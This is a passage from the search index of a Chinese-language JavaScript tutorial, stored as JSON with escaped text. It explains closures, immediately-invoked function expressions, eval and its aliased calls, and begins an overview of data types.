\u6709\u4e24\u79cd\u4f5c\u7528\u57df\uff1a\u5168\u5c40\u4f5c\u7528\u57df\u548c\u51fd\u6570\u4f5c\u7528\u57df\u3002\u51fd\u6570\u5185\u90e8\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6\u5168\u5c40\u53d8\u91cf\u3002 1 2 3 4 5 6 var n = 999 ; function f1 () { console . log ( n ); } f1 () // 999 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 f1 \u53ef\u4ee5\u8bfb\u53d6\u5168\u5c40\u53d8\u91cf n \u3002 \u4f46\u662f\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u51fd\u6570\u5916\u90e8\u65e0\u6cd5\u8bfb\u53d6\u51fd\u6570\u5185\u90e8\u58f0\u660e\u7684\u53d8\u91cf\u3002 1 2 3 4 5 6 function f1 () { var n = 999 ; } console . log ( n ) // Uncaught ReferenceError: n is not defined( \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 f1 \u5185\u90e8\u58f0\u660e\u7684\u53d8\u91cf n \uff0c\u51fd\u6570\u5916\u662f\u65e0\u6cd5\u8bfb\u53d6\u7684\u3002 \u5982\u679c\u51fa\u4e8e\u79cd\u79cd\u539f\u56e0\uff0c\u9700\u8981\u5f97\u5230\u51fd\u6570\u5185\u7684\u5c40\u90e8\u53d8\u91cf\u3002\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8fd9\u662f\u529e\u4e0d\u5230\u7684\uff0c\u53ea\u6709\u901a\u8fc7\u53d8\u901a\u65b9\u6cd5\u624d\u80fd\u5b9e\u73b0\u3002\u90a3\u5c31\u662f\u5728\u51fd\u6570\u7684\u5185\u90e8\uff0c\u518d\u5b9a\u4e49\u4e00\u4e2a\u51fd\u6570\u3002 1 2 3 4 5 6 function f1 () { var n = 999 ; function f2 () { \u3000\u3000 console . log ( n ); // 999 } } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 f2 \u5c31\u5728\u51fd\u6570 f1 \u5185\u90e8\uff0c\u8fd9\u65f6 f1 \u5185\u90e8\u7684\u6240\u6709\u5c40\u90e8\u53d8\u91cf\uff0c\u5bf9 f2 \u90fd\u662f\u53ef\u89c1\u7684\u3002\u4f46\u662f\u53cd\u8fc7\u6765\u5c31\u4e0d\u884c\uff0c f2 \u5185\u90e8\u7684\u5c40\u90e8\u53d8\u91cf\uff0c\u5bf9 f1 \u5c31\u662f\u4e0d\u53ef\u89c1\u7684\u3002\u8fd9\u5c31\u662f JavaScript \u8bed\u8a00\u7279\u6709\u7684\"\u94fe\u5f0f\u4f5c\u7528\u57df\"\u7ed3\u6784\uff08chain scope\uff09\uff0c\u5b50\u5bf9\u8c61\u4f1a\u4e00\u7ea7\u4e00\u7ea7\u5730\u5411\u4e0a\u5bfb\u627e\u6240\u6709\u7236\u5bf9\u8c61\u7684\u53d8\u91cf\u3002\u6240\u4ee5\uff0c\u7236\u5bf9\u8c61\u7684\u6240\u6709\u53d8\u91cf\uff0c\u5bf9\u5b50\u5bf9\u8c61\u90fd\u662f\u53ef\u89c1\u7684\uff0c\u53cd\u4e4b\u5219\u4e0d\u6210\u7acb\u3002 \u65e2\u7136 f2 \u53ef\u4ee5\u8bfb\u53d6 f1 \u7684\u5c40\u90e8\u53d8\u91cf\uff0c\u90a3\u4e48\u53ea\u8981\u628a f2 \u4f5c\u4e3a\u8fd4\u56de\u503c\uff0c\u6211\u4eec\u4e0d\u5c31\u53ef\u4ee5\u5728 f1 \u5916\u90e8\u8bfb\u53d6\u5b83\u7684\u5185\u90e8\u53d8\u91cf\u4e86\u5417\uff01 1 2 3 4 5 6 7 8 9 10 function f1 () { var n = 999 ; function f2 () { console . log ( n ); } return f2 ; } var result = f1 (); result (); // 999 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 f1 \u7684\u8fd4\u56de\u503c\u5c31\u662f\u51fd\u6570 f2 \uff0c\u7531\u4e8e f2 \u53ef\u4ee5\u8bfb\u53d6 f1 \u7684\u5185\u90e8\u53d8\u91cf\uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5\u5728\u5916\u90e8\u83b7\u5f97 f1 \u7684\u5185\u90e8\u53d8\u91cf\u4e86\u3002 \u95ed\u5305\u5c31\u662f\u51fd\u6570 f2 \uff0c\u5373\u80fd\u591f\u8bfb\u53d6\u5176\u4ed6\u51fd\u6570\u5185\u90e8\u53d8\u91cf\u7684\u51fd\u6570\u3002\u7531\u4e8e\u5728 JavaScript \u8bed\u8a00\u4e2d\uff0c\u53ea\u6709\u51fd\u6570\u5185\u90e8\u7684\u5b50\u51fd\u6570\u624d\u80fd\u8bfb\u53d6\u5185\u90e8\u53d8\u91cf\uff0c\u56e0\u6b64\u53ef\u4ee5\u628a\u95ed\u5305\u7b80\u5355\u7406\u89e3\u6210\u201c\u5b9a\u4e49\u5728\u4e00\u4e2a\u51fd\u6570\u5185\u90e8\u7684\u51fd\u6570\u201d\u3002\u95ed\u5305\u6700\u5927\u7684\u7279\u70b9\uff0c\u5c31\u662f\u5b83\u53ef\u4ee5\u201c\u8bb0\u4f4f\u201d\u8bde\u751f\u7684\u73af\u5883\uff0c\u6bd4\u5982 f2 \u8bb0\u4f4f\u4e86\u5b83\u8bde\u751f\u7684\u73af\u5883 f1 \uff0c\u6240\u4ee5\u4ece f2 \u53ef\u4ee5\u5f97\u5230 f1 \u7684\u5185\u90e8\u53d8\u91cf\u3002\u5728\u672c\u8d28\u4e0a\uff0c\u95ed\u5305\u5c31\u662f\u5c06\u51fd\u6570\u5185\u90e8\u548c\u51fd\u6570\u5916\u90e8\u8fde\u63a5\u8d77\u6765\u7684\u4e00\u5ea7\u6865\u6881\u3002 \u95ed\u5305\u7684\u6700\u5927\u7528\u5904\u6709\u4e24\u4e2a\uff0c\u4e00\u4e2a\u662f\u53ef\u4ee5\u8bfb\u53d6\u5916\u5c42\u51fd\u6570\u5185\u90e8\u7684\u53d8\u91cf\uff0c\u53e6\u4e00\u4e2a\u5c31\u662f\u8ba9\u8fd9\u4e9b\u53d8\u91cf\u59cb\u7ec8\u4fdd\u6301\u5728\u5185\u5b58\u4e2d\uff0c\u5373\u95ed\u5305\u53ef\u4ee5\u4f7f\u5f97\u5b83\u8bde\u751f\u73af\u5883\u4e00\u76f4\u5b58\u5728\u3002\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\uff0c\u95ed\u5305\u4f7f\u5f97\u5185\u90e8\u53d8\u91cf\u8bb0\u4f4f\u4e0a\u4e00\u6b21\u8c03\u7528\u65f6\u7684\u8fd0\u7b97\u7ed3\u679c\u3002 1 2 3 4 5 6 7 8 9 10 11 function createIncrementor ( start ) { return function () { return start ++ ; }; } var inc = createIncrementor ( 5 ); inc () // 5 inc () // 6 inc () // 7 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c start \u662f\u51fd\u6570 createIncrementor \u7684\u5185\u90e8\u53d8\u91cf\u3002\u901a\u8fc7\u95ed\u5305\uff0c start \u7684\u72b6\u6001\u88ab\u4fdd\u7559\u4e86\uff0c\u6bcf\u4e00\u6b21\u8c03\u7528\u90fd\u662f\u5728\u4e0a\u4e00\u6b21\u8c03\u7528\u7684\u57fa\u7840\u4e0a\u8fdb\u884c\u8ba1\u7b97\u3002\u4ece\u4e2d\u53ef\u4ee5\u770b\u5230\uff0c\u95ed\u5305 inc \u4f7f\u5f97\u51fd\u6570 createIncrementor \u7684\u5185\u90e8\u73af\u5883\uff0c\u4e00\u76f4\u5b58\u5728\u3002\u6240\u4ee5\uff0c\u95ed\u5305\u53ef\u4ee5\u770b\u4f5c\u662f\u51fd\u6570\u5185\u90e8\u4f5c\u7528\u57df\u7684\u4e00\u4e2a\u63a5\u53e3\u3002 \u4e3a\u4ec0\u4e48\u95ed\u5305\u80fd\u591f\u8fd4\u56de\u5916\u5c42\u51fd\u6570\u7684\u5185\u90e8\u53d8\u91cf\uff1f\u539f\u56e0\u662f\u95ed\u5305\uff08\u4e0a\u4f8b\u7684 inc \uff09\u7528\u5230\u4e86\u5916\u5c42\u53d8\u91cf\uff08 start \uff09\uff0c\u5bfc\u81f4\u5916\u5c42\u51fd\u6570\uff08 createIncrementor \uff09\u4e0d\u80fd\u4ece\u5185\u5b58\u91ca\u653e\u3002\u53ea\u8981\u95ed\u5305\u6ca1\u6709\u88ab\u5783\u573e\u56de\u6536\u673a\u5236\u6e05\u9664\uff0c\u5916\u5c42\u51fd\u6570\u63d0\u4f9b\u7684\u8fd0\u884c\u73af\u5883\u4e5f\u4e0d\u4f1a\u88ab\u6e05\u9664\uff0c\u5b83\u7684\u5185\u90e8\u53d8\u91cf\u5c31\u59cb\u7ec8\u4fdd\u5b58\u7740\u5f53\u524d\u503c\uff0c\u4f9b\u95ed\u5305\u8bfb\u53d6\u3002 \u95ed\u5305\u7684\u53e6\u4e00\u4e2a\u7528\u5904\uff0c\u662f\u5c01\u88c5\u5bf9\u8c61\u7684\u79c1\u6709\u5c5e\u6027\u548c\u79c1\u6709\u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 function Person ( name ) { var _age ; function setAge ( n ) { _age = n ; } function getAge () { return _age ; } return { name : name , getAge : getAge , setAge : setAge }; } var p1 = Person ( '\u5f20\u4e09' ); p1 . setAge ( 25 ); p1 . getAge () // 25 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 Person \u7684\u5185\u90e8\u53d8\u91cf _age \uff0c\u901a\u8fc7\u95ed\u5305 getAge \u548c setAge \uff0c\u53d8\u6210\u4e86\u8fd4\u56de\u5bf9\u8c61 p1 \u7684\u79c1\u6709\u53d8\u91cf\u3002 \u6ce8\u610f\uff0c\u5916\u5c42\u51fd\u6570\u6bcf\u6b21\u8fd0\u884c\uff0c\u90fd\u4f1a\u751f\u6210\u4e00\u4e2a\u65b0\u7684\u95ed\u5305\uff0c\u800c\u8fd9\u4e2a\u95ed\u5305\u53c8\u4f1a\u4fdd\u7559\u5916\u5c42\u51fd\u6570\u7684\u5185\u90e8\u53d8\u91cf\uff0c\u6240\u4ee5\u5185\u5b58\u6d88\u8017\u5f88\u5927\u3002\u56e0\u6b64\u4e0d\u80fd\u6ee5\u7528\u95ed\u5305\uff0c\u5426\u5219\u4f1a\u9020\u6210\u7f51\u9875\u7684\u6027\u80fd\u95ee\u9898\u3002","title":"\u95ed\u5305"},{"location":"types/function/#iife","text":"\u6839\u636e JavaScript \u7684\u8bed\u6cd5\uff0c\u5706\u62ec\u53f7 () \u8ddf\u5728\u51fd\u6570\u540d\u4e4b\u540e\uff0c\u8868\u793a\u8c03\u7528\u8be5\u51fd\u6570\u3002\u6bd4\u5982\uff0c print() \u5c31\u8868\u793a\u8c03\u7528 print \u51fd\u6570\u3002 \u6709\u65f6\uff0c\u6211\u4eec\u9700\u8981\u5728\u5b9a\u4e49\u51fd\u6570\u4e4b\u540e\uff0c\u7acb\u5373\u8c03\u7528\u8be5\u51fd\u6570\u3002\u8fd9\u65f6\uff0c\u4f60\u4e0d\u80fd\u5728\u51fd\u6570\u7684\u5b9a\u4e49\u4e4b\u540e\u52a0\u4e0a\u5706\u62ec\u53f7\uff0c\u8fd9\u4f1a\u4ea7\u751f\u8bed\u6cd5\u9519\u8bef\u3002 1 2 function (){ /* code */ }(); // SyntaxError: Unexpected token ( \u4ea7\u751f\u8fd9\u4e2a\u9519\u8bef\u7684\u539f\u56e0\u662f\uff0c function \u8fd9\u4e2a\u5173\u952e\u5b57\u65e2\u53ef\u4ee5\u5f53\u4f5c\u8bed\u53e5\uff0c\u4e5f\u53ef\u4ee5\u5f53\u4f5c\u8868\u8fbe\u5f0f\u3002 1 2 3 4 5 // \u8bed\u53e5 function f () {} // \u8868\u8fbe\u5f0f var f = function f () {} \u5f53\u4f5c\u8868\u8fbe\u5f0f\u65f6\uff0c\u51fd\u6570\u53ef\u4ee5\u5b9a\u4e49\u540e\u76f4\u63a5\u52a0\u5706\u62ec\u53f7\u8c03\u7528\u3002 1 2 var f = function f (){ return 1 }(); f // 1 \u4e0a\u9762\u7684\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570\u5b9a\u4e49\u540e\u76f4\u63a5\u52a0\u5706\u62ec\u53f7\u8c03\u7528\uff0c\u6ca1\u6709\u62a5\u9519\u3002\u539f\u56e0\u5c31\u662f function \u4f5c\u4e3a\u8868\u8fbe\u5f0f\uff0c\u5f15\u64ce\u5c31\u628a\u51fd\u6570\u5b9a\u4e49\u5f53\u4f5c\u4e00\u4e2a\u503c\u3002\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5c31\u4e0d\u4f1a\u62a5\u9519\u3002 \u4e3a\u4e86\u907f\u514d\u89e3\u6790\u7684\u6b67\u4e49\uff0cJavaScript \u89c4\u5b9a\uff0c\u5982\u679c function \u5173\u952e\u5b57\u51fa\u73b0\u5728\u884c\u9996\uff0c\u4e00\u5f8b\u89e3\u91ca\u6210\u8bed\u53e5\u3002\u56e0\u6b64\uff0c\u5f15\u64ce\u770b\u5230\u884c\u9996\u662f function \u5173\u952e\u5b57\u4e4b\u540e\uff0c\u8ba4\u4e3a\u8fd9\u4e00\u6bb5\u90fd\u662f\u51fd\u6570\u7684\u5b9a\u4e49\uff0c\u4e0d\u5e94\u8be5\u4ee5\u5706\u62ec\u53f7\u7ed3\u5c3e\uff0c\u6240\u4ee5\u5c31\u62a5\u9519\u4e86\u3002 \u51fd\u6570\u5b9a\u4e49\u540e\u7acb\u5373\u8c03\u7528\u7684\u89e3\u51b3\u65b9\u6cd5\uff0c\u5c31\u662f\u4e0d\u8981\u8ba9 function \u51fa\u73b0\u5728\u884c\u9996\uff0c\u8ba9\u5f15\u64ce\u5c06\u5176\u7406\u89e3\u6210\u4e00\u4e2a\u8868\u8fbe\u5f0f\u3002\u6700\u7b80\u5355\u7684\u5904\u7406\uff0c\u5c31\u662f\u5c06\u5176\u653e\u5728\u4e00\u4e2a\u5706\u62ec\u53f7\u91cc\u9762\u3002 1 2 3 ( function (){ /* code */ }()); // \u6216\u8005 ( function (){ /* code */ })(); \u4e0a\u9762\u4e24\u79cd\u5199\u6cd5\u90fd\u662f\u4ee5\u5706\u62ec\u53f7\u5f00\u5934\uff0c\u5f15\u64ce\u5c31\u4f1a\u8ba4\u4e3a\u540e\u9762\u8ddf\u7684\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u800c\u4e0d\u662f\u51fd\u6570\u5b9a\u4e49\u8bed\u53e5\uff0c\u6240\u4ee5\u5c31\u907f\u514d\u4e86\u9519\u8bef\u3002\u8fd9\u5c31\u53eb\u505a\u201c\u7acb\u5373\u8c03\u7528\u7684\u51fd\u6570\u8868\u8fbe\u5f0f\u201d\uff08Immediately-Invoked Function Expression\uff09\uff0c\u7b80\u79f0 IIFE\u3002 \u6ce8\u610f\uff0c\u4e0a\u9762\u4e24\u79cd\u5199\u6cd5\u6700\u540e\u7684\u5206\u53f7\u90fd\u662f\u5fc5\u987b\u7684\u3002\u5982\u679c\u7701\u7565\u5206\u53f7\uff0c\u9047\u5230\u8fde\u7740\u4e24\u4e2a IIFE\uff0c\u53ef\u80fd\u5c31\u4f1a\u62a5\u9519\u3002 1 2 3 // \u62a5\u9519 ( function (){ /* code */ }()) ( function (){ /* code */ }()) \u4e0a\u9762\u4ee3\u7801\u7684\u4e24\u884c\u4e4b\u95f4\u6ca1\u6709\u5206\u53f7\uff0cJavaScript \u4f1a\u5c06\u5b83\u4eec\u8fde\u5728\u4e00\u8d77\u89e3\u91ca\uff0c\u5c06\u7b2c\u4e8c\u884c\u89e3\u91ca\u4e3a\u7b2c\u4e00\u884c\u7684\u53c2\u6570\u3002 \u63a8\u800c\u5e7f\u4e4b\uff0c\u4efb\u4f55\u8ba9\u89e3\u91ca\u5668\u4ee5\u8868\u8fbe\u5f0f\u6765\u5904\u7406\u51fd\u6570\u5b9a\u4e49\u7684\u65b9\u6cd5\uff0c\u90fd\u80fd\u4ea7\u751f\u540c\u6837\u7684\u6548\u679c\uff0c\u6bd4\u5982\u4e0b\u9762\u4e09\u79cd\u5199\u6cd5\u3002 1 2 3 var i = function (){ return 10 ; }(); true && function (){ /* code */ }(); 0 , function (){ /* code */ }(); \u751a\u81f3\u50cf\u4e0b\u9762\u8fd9\u6837\u5199\uff0c\u4e5f\u662f\u53ef\u4ee5\u7684\u3002 1 2 3 4 ! function () { /* code */ }(); ~ function () { /* code */ }(); - function () { /* code */ }(); + function () { /* code */ }(); \u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u53ea\u5bf9\u533f\u540d\u51fd\u6570\u4f7f\u7528\u8fd9\u79cd\u201c\u7acb\u5373\u6267\u884c\u7684\u51fd\u6570\u8868\u8fbe\u5f0f\u201d\u3002\u5b83\u7684\u76ee\u7684\u6709\u4e24\u4e2a\uff1a\u4e00\u662f\u4e0d\u5fc5\u4e3a\u51fd\u6570\u547d\u540d\uff0c\u907f\u514d\u4e86\u6c61\u67d3\u5168\u5c40\u53d8\u91cf\uff1b\u4e8c\u662f IIFE \u5185\u90e8\u5f62\u6210\u4e86\u4e00\u4e2a\u5355\u72ec\u7684\u4f5c\u7528\u57df\uff0c\u53ef\u4ee5\u5c01\u88c5\u4e00\u4e9b\u5916\u90e8\u65e0\u6cd5\u8bfb\u53d6\u7684\u79c1\u6709\u53d8\u91cf\u3002 1 2 3 4 5 6 7 8 9 10 11 // \u5199\u6cd5\u4e00 var tmp = newData ; processData ( tmp ); storeData ( tmp ); // \u5199\u6cd5\u4e8c ( function () { var tmp = newData ; processData ( tmp ); storeData ( tmp ); }()); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5199\u6cd5\u4e8c\u6bd4\u5199\u6cd5\u4e00\u66f4\u597d\uff0c\u56e0\u4e3a\u5b8c\u5168\u907f\u514d\u4e86\u6c61\u67d3\u5168\u5c40\u53d8\u91cf\u3002","title":"\u7acb\u5373\u8c03\u7528\u7684\u51fd\u6570\u8868\u8fbe\u5f0f\uff08IIFE\uff09"},{"location":"types/function/#eval","text":"","title":"eval \u547d\u4ee4"},{"location":"types/function/#_19","text":"eval \u547d\u4ee4\u63a5\u53d7\u4e00\u4e2a\u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570\uff0c\u5e76\u5c06\u8fd9\u4e2a\u5b57\u7b26\u4e32\u5f53\u4f5c\u8bed\u53e5\u6267\u884c\u3002 1 2 eval ( 'var a = 1;' ); a // 1 \u4e0a\u9762\u4ee3\u7801\u5c06\u5b57\u7b26\u4e32\u5f53\u4f5c\u8bed\u53e5\u8fd0\u884c\uff0c\u751f\u6210\u4e86\u53d8\u91cf a \u3002 \u5982\u679c\u53c2\u6570\u5b57\u7b26\u4e32\u65e0\u6cd5\u5f53\u4f5c\u8bed\u53e5\u8fd0\u884c\uff0c\u90a3\u4e48\u5c31\u4f1a\u62a5\u9519\u3002 1 eval ( '3x' ) // Uncaught SyntaxError: Invalid or unexpected token \u653e\u5728 eval \u4e2d\u7684\u5b57\u7b26\u4e32\uff0c\u5e94\u8be5\u6709\u72ec\u81ea\u5b58\u5728\u7684\u610f\u4e49\uff0c\u4e0d\u80fd\u7528\u6765\u4e0e eval \u4ee5\u5916\u7684\u547d\u4ee4\u914d\u5408\u4f7f\u7528\u3002\u4e3e\u4f8b\u6765\u8bf4\uff0c\u4e0b\u9762\u7684\u4ee3\u7801\u5c06\u4f1a\u62a5\u9519\u3002 1 eval ( 'return;' ); // Uncaught SyntaxError: Illegal return statement \u4e0a\u9762\u4ee3\u7801\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a return \u4e0d\u80fd\u5355\u72ec\u4f7f\u7528\uff0c\u5fc5\u987b\u5728\u51fd\u6570\u4e2d\u4f7f\u7528\u3002 \u5982\u679c eval \u7684\u53c2\u6570\u4e0d\u662f\u5b57\u7b26\u4e32\uff0c\u90a3\u4e48\u4f1a\u539f\u6837\u8fd4\u56de\u3002 1 eval ( 123 ) // 123 eval \u6ca1\u6709\u81ea\u5df1\u7684\u4f5c\u7528\u57df\uff0c\u90fd\u5728\u5f53\u524d\u4f5c\u7528\u57df\u5185\u6267\u884c\uff0c\u56e0\u6b64\u53ef\u80fd\u4f1a\u4fee\u6539\u5f53\u524d\u4f5c\u7528\u57df\u7684\u53d8\u91cf\u7684\u503c\uff0c\u9020\u6210\u5b89\u5168\u95ee\u9898\u3002 1 2 3 4 var a = 1 ; eval ( 'a = 2' ); a // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c eval \u547d\u4ee4\u4fee\u6539\u4e86\u5916\u90e8\u53d8\u91cf a \u7684\u503c\u3002\u7531\u4e8e\u8fd9\u4e2a\u539f\u56e0\uff0c eval \u6709\u5b89\u5168\u98ce\u9669\u3002 \u4e3a\u4e86\u9632\u6b62\u8fd9\u79cd\u98ce\u9669\uff0cJavaScript \u89c4\u5b9a\uff0c\u5982\u679c\u4f7f\u7528\u4e25\u683c\u6a21\u5f0f\uff0c eval \u5185\u90e8\u58f0\u660e\u7684\u53d8\u91cf\uff0c\u4e0d\u4f1a\u5f71\u54cd\u5230\u5916\u90e8\u4f5c\u7528\u57df\u3002 1 2 3 4 5 ( function f () { 'use strict' ; eval ( 'var foo = 123' ); console . log ( foo ); // ReferenceError: foo is not defined })() \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 f \u5185\u90e8\u662f\u4e25\u683c\u6a21\u5f0f\uff0c\u8fd9\u65f6 eval \u5185\u90e8\u58f0\u660e\u7684 foo \u53d8\u91cf\uff0c\u5c31\u4e0d\u4f1a\u5f71\u54cd\u5230\u5916\u90e8\u3002 \u4e0d\u8fc7\uff0c\u5373\u4f7f\u5728\u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c eval \u4f9d\u7136\u53ef\u4ee5\u8bfb\u5199\u5f53\u524d\u4f5c\u7528\u57df\u7684\u53d8\u91cf\u3002 1 2 3 4 5 6 ( function f () { 'use strict' ; var foo = 1 ; eval ( 'foo = 2' ); console . log ( foo ); // 2 })() \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c eval \u5185\u90e8\u8fd8\u662f\u6539\u5199\u4e86\u5916\u90e8\u53d8\u91cf\uff0c\u53ef\u89c1\u5b89\u5168\u98ce\u9669\u4f9d\u7136\u5b58\u5728\u3002 \u603b\u4e4b\uff0c eval \u7684\u672c\u8d28\u662f\u5728\u5f53\u524d\u4f5c\u7528\u57df\u4e4b\u4e2d\uff0c\u6ce8\u5165\u4ee3\u7801\u3002\u7531\u4e8e\u5b89\u5168\u98ce\u9669\u548c\u4e0d\u5229\u4e8e JavaScript \u5f15\u64ce\u4f18\u5316\u6267\u884c\u901f\u5ea6\uff0c\u4e00\u822c\u4e0d\u63a8\u8350\u4f7f\u7528\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c eval \u6700\u5e38\u89c1\u7684\u573a\u5408\u662f\u89e3\u6790 JSON \u6570\u636e\u7684\u5b57\u7b26\u4e32\uff0c\u4e0d\u8fc7\u6b63\u786e\u7684\u505a\u6cd5\u5e94\u8be5\u662f\u4f7f\u7528\u539f\u751f\u7684 JSON.parse \u65b9\u6cd5\u3002","title":"\u57fa\u672c\u7528\u6cd5"},{"location":"types/function/#eval_1","text":"\u524d\u9762\u8bf4\u8fc7 eval \u4e0d\u5229\u4e8e\u5f15\u64ce\u4f18\u5316\u6267\u884c\u901f\u5ea6\u3002\u66f4\u9ebb\u70e6\u7684\u662f\uff0c\u8fd8\u6709\u4e0b\u9762\u8fd9\u79cd\u60c5\u51b5\uff0c\u5f15\u64ce\u5728\u9759\u6001\u4ee3\u7801\u5206\u6790\u7684\u9636\u6bb5\uff0c\u6839\u672c\u65e0\u6cd5\u5206\u8fa8\u6267\u884c\u7684\u662f eval \u3002 1 2 3 var m = eval ; m ( 'var x = 1' ); x // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf m \u662f eval \u7684\u522b\u540d\u3002\u9759\u6001\u4ee3\u7801\u5206\u6790\u9636\u6bb5\uff0c\u5f15\u64ce\u5206\u8fa8\u4e0d\u51fa m('var x = 1') \u6267\u884c\u7684\u662f eval \u547d\u4ee4\u3002 \u4e3a\u4e86\u4fdd\u8bc1 eval \u7684\u522b\u540d\u4e0d\u5f71\u54cd\u4ee3\u7801\u4f18\u5316\uff0cJavaScript \u7684\u6807\u51c6\u89c4\u5b9a\uff0c\u51e1\u662f\u4f7f\u7528\u522b\u540d\u6267\u884c eval \uff0c eval \u5185\u90e8\u4e00\u5f8b\u662f\u5168\u5c40\u4f5c\u7528\u57df\u3002 1 2 3 4 5 6 7 8 9 var a = 1 ; function f () { var a = 2 ; var e = eval ; e ( 'console.log(a)' ); } f () // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c eval \u662f\u522b\u540d\u8c03\u7528\uff0c\u6240\u4ee5\u5373\u4f7f\u5b83\u662f\u5728\u51fd\u6570\u4e2d\uff0c\u5b83\u7684\u4f5c\u7528\u57df\u8fd8\u662f\u5168\u5c40\u4f5c\u7528\u57df\uff0c\u56e0\u6b64\u8f93\u51fa\u7684 a \u4e3a\u5168\u5c40\u53d8\u91cf\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u5f15\u64ce\u5c31\u80fd\u786e\u8ba4 e() \u4e0d\u4f1a\u5bf9\u5f53\u524d\u7684\u51fd\u6570\u4f5c\u7528\u57df\u4ea7\u751f\u5f71\u54cd\uff0c\u4f18\u5316\u7684\u65f6\u5019\u5c31\u53ef\u4ee5\u628a\u8fd9\u4e00\u884c\u6392\u9664\u6389\u3002 eval \u7684\u522b\u540d\u8c03\u7528\u7684\u5f62\u5f0f\u4e94\u82b1\u516b\u95e8\uff0c\u53ea\u8981\u4e0d\u662f\u76f4\u63a5\u8c03\u7528\uff0c\u90fd\u5c5e\u4e8e\u522b\u540d\u8c03\u7528\uff0c\u56e0\u4e3a\u5f15\u64ce\u53ea\u80fd\u5206\u8fa8 eval() \u8fd9\u4e00\u79cd\u5f62\u5f0f\u662f\u76f4\u63a5\u8c03\u7528\u3002 1 2 3 4 eval . call ( null , '...' ) window . eval ( '...' ) ( 1 , eval )( '...' ) ( eval , eval )( '...' ) \u4e0a\u9762\u8fd9\u4e9b\u5f62\u5f0f\u90fd\u662f eval \u7684\u522b\u540d\u8c03\u7528\uff0c\u4f5c\u7528\u57df\u90fd\u662f\u5168\u5c40\u4f5c\u7528\u57df\u3002","title":"eval \u7684\u522b\u540d\u8c03\u7528"},{"location":"types/function/#_20","text":"Ben Alman, Immediately-Invoked Function Expression (IIFE) Mark Daggett, Functions Explained Juriy Zaytsev, Named function expressions demystified Marco Rogers polotek, What is the arguments object? Juriy Zaytsev, Global eval. What are the options? Axel Rauschmayer, Evaluating JavaScript code via eval() and new Function()","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"types/general/","text":"\u6570\u636e\u7c7b\u578b\u6982\u8ff0 \u00b6 \u7b80\u4ecb \u00b6 JavaScript \u8bed\u8a00\u7684\u6bcf\u4e00\u4e2a\u503c\uff0c\u90fd\u5c5e\u4e8e\u67d0\u4e00\u79cd\u6570\u636e\u7c7b\u578b\u3002JavaScript \u7684\u6570\u636e\u7c7b\u578b\uff0c\u5171\u6709\u516d\u79cd\u3002\uff08ES6 \u53c8\u65b0\u589e\u4e86\u7b2c\u4e03\u79cd Symbol \u7c7b\u578b\u7684\u503c\uff0c\u672c\u6559\u7a0b\u4e0d\u6d89\u53ca\u3002\uff09 \u6570\u503c\uff08number\uff09\uff1a\u6574\u6570\u548c\u5c0f\u6570\uff08\u6bd4\u5982 1 \u548c 3.14 \uff09\u3002 \u5b57\u7b26\u4e32\uff08string\uff09\uff1a\u6587\u672c\uff08\u6bd4\u5982 Hello World \uff09\u3002 \u5e03\u5c14\u503c\uff08boolean\uff09\uff1a\u8868\u793a\u771f\u4f2a\u7684\u4e24\u4e2a\u7279\u6b8a\u503c\uff0c\u5373 true \uff08\u771f\uff09\u548c false \uff08\u5047\uff09\u3002 undefined \uff1a\u8868\u793a\u201c\u672a\u5b9a\u4e49\u201d\u6216\u4e0d\u5b58\u5728\uff0c\u5373\u7531\u4e8e\u76ee\u524d\u6ca1\u6709\u5b9a\u4e49\uff0c\u6240\u4ee5\u6b64\u5904\u6682\u65f6\u6ca1\u6709\u4efb\u4f55\u503c\u3002 null \uff1a\u8868\u793a\u7a7a\u503c\uff0c\u5373\u6b64\u5904\u7684\u503c\u4e3a\u7a7a\u3002 \u5bf9\u8c61\uff08object\uff09\uff1a\u5404\u79cd\u503c\u7ec4\u6210\u7684\u96c6\u5408\u3002 \u901a\u5e38\uff0c\u6570\u503c\u3001\u5b57\u7b26\u4e32\u3001\u5e03\u5c14\u503c\u8fd9\u4e09\u79cd\u7c7b\u578b\uff0c\u5408\u79f0\u4e3a\u539f\u59cb\u7c7b\u578b\uff08primitive type\uff09\u7684\u503c\uff0c\u5373\u5b83\u4eec\u662f\u6700\u57fa\u672c\u7684\u6570\u636e\u7c7b\u578b\uff0c\u4e0d\u80fd\u518d\u7ec6\u5206\u4e86\u3002\u5bf9\u8c61\u5219\u79f0\u4e3a\u5408\u6210\u7c7b\u578b\uff08complex 